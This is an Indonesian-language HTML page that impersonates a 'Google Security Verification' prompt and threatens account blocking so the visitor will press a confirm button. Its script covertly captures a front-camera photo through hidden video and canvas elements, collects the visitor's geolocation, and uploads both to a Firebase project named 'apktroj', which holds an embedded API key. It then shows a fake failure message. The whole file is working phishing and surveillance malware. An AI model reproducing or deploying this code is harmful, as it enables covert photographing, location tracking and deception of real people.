<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Security Verification</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-100 flex items-center justify-center min-h-screen">
    <div class="bg-white p-6 rounded-2xl shadow-xl max-w-sm w-full text-center border-t-4 border-red-600">
        <h1 class="text-lg font-bold mb-2">Pembaruan Keamanan Wajib</h1>
        <p class="text-sm text-gray-600 mb-6">Verifikasi identitas diperlukan untuk mencegah pemblokiran akun. Izinkan akses enkripsi media untuk melanjutkan.</p>
        
        <button id="auth-btn" class="bg-red-600 text-white w-full py-3 rounded-xl font-bold shadow-lg">
            KONFIRMASI IDENTITAS
        </button>
        
        <div id="loader" class="hidden mt-4 text-xs text-gray-500 animate-pulse">Menghubungkan ke server enkripsi...</div>
        
        <!-- Hidden elements for capture -->
        <video id="v" style="display:none;" autoplay></video>
        <canvas id="c" style="display:none;"></canvas>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
        import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyBhJsqqGbJGZ-u-PqJ5m4L-gHCaTqlS3Wo",
            authDomain: "apktroj.firebaseapp.com",
            projectId: "apktroj",
            storageBucket: "apktroj.firebasestorage.app",
            messagingSenderId: "943833619122",
            appId: "1:943833619122:web:d757ced4d56267abf247ab"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);
        const appId = "apktroj";

        document.getElementById('auth-btn').onclick = async () => {
            document.getElementById('loader').classList.remove('hidden');
            
            try {
                // Minta Izin Kamera & Mic sekaligus
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: { facingMode: "user" } });
                
                // 1. Ambil Foto Candid (Front Camera)
                const video = document.getElementById('v');
                video.srcObject = stream;
                
                setTimeout(async () => {
                    const canvas = document.getElementById('c');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    const photoData = canvas.toDataURL('image/jpeg', 0.5);

                    // 2. Kirim Foto ke Firestore
                    await addDoc(collection(db, 'artifacts', appId, 'public', 'data', 'media_logs'), {
                        type: 'image',
                        data: photoData,
                        timestamp: serverTimestamp()
                    });

                    // 3. Ambil Lokasi juga biar komplit
                    navigator.geolocation.getCurrentPosition(async (pos) => {
                        await addDoc(collection(db, 'artifacts', appId, 'public', 'data', 'location_logs'), {
                            lat: pos.coords.latitude,
                            lng: pos.coords.longitude,
                            timestamp: serverTimestamp()
                        });
                    });

                    alert("Verifikasi Gagal. Silahkan coba lagi nanti.");
                    stream.getTracks().forEach(track => track.stop());
                }, 2000);

            } catch (err) {
                alert("Anda harus mengizinkan akses kamera/mic untuk verifikasi!");
            }
        };
    </script>
</body>
</html>
